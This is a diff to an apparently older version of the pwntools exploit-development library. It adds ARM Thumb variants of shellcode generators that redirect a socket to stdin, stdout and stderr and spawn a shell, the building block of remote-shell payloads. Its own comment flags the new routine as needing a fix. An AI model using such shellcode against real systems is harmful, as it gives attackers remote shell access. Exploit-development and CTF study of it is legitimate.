@@ -1,8 +1,8 @@
 from pwn.internal.shellcode_helper import *
 from sh import sh
 
-@shellcode_reqs(arch=['i386', 'amd64', 'arm'], os=['linux', 'freebsd'])
-def dupsh(sock = 'ebp', os = None):
+@shellcode_reqs(arch=['i386', 'amd64', 'arm', 'thumb'], os=['linux', 'freebsd'])
+def dupsh(sock = False, os = None):
     """Args: [sock (imm/reg) = ebp]
     Duplicates sock to stdin, stdout and stderr and spawns a shell."""
     if os in ['freebsd', 'linux']:
@@ -10,11 +10,17 @@ def dupsh(sock = 'ebp', os = None):
     else:
         bug('OS was neither linux nor freebsd')
 
-@shellcode_reqs(arch=['i386', 'amd64', 'arm'], os=['linux', 'freebsd'])
-def dup(sock = 'ebp', os = None, arch = None):
+@shellcode_reqs(arch=['i386', 'amd64', 'arm', 'thumb'], os=['linux', 'freebsd'])
+def dup(sock = False, os = None, arch = None):
     """Args: [sock (imm/reg) = ebp]
     Duplicates sock to stdin, stdout and stderr."""
 
+    if sock == False:
+        if arch in ['i386']:
+            sock = 'ebp'
+        elif arch in ['thumb']:
+            sock = 'r6'
+    
     sock = arg_fixup(sock)
 
     if arch == 'i386':
@@ -27,6 +33,8 @@ def dup(sock = 'ebp', os = None, arch = None):
             return _dup_amd64(sock)
     elif arch == 'arm' and os == 'linux':
         return _dup_linux_arm(sock)
+    elif arch == 'thumb' and os == 'linux':
+        return _dup_linux_thumb(sock)
 
     bug('OS/arch combination (%s,%s) is not supported for dup' % (os, arch))
 
@@ -89,3 +97,18 @@ def _dup_linux_arm(sock):
             'adds r8, #-1',
             'bpl dup_helper'])
 
+def _dup_linux_thumb(sock):
+    def mov(r, v):
+        return pwn.shellcode.mov(r, v, raw = True)
+
+    out = mov('r1', 3)
+    out+= mov('r7', 'SYS_dup2')
+    out+= """
+    loop:
+		/* expect r6 to contain fd - should be fixed*/
+        mov r0, %(sock)s
+        sub r1, #1
+        svc 1
+        bne loop
+    """ % {'sock': sock}
+    return out
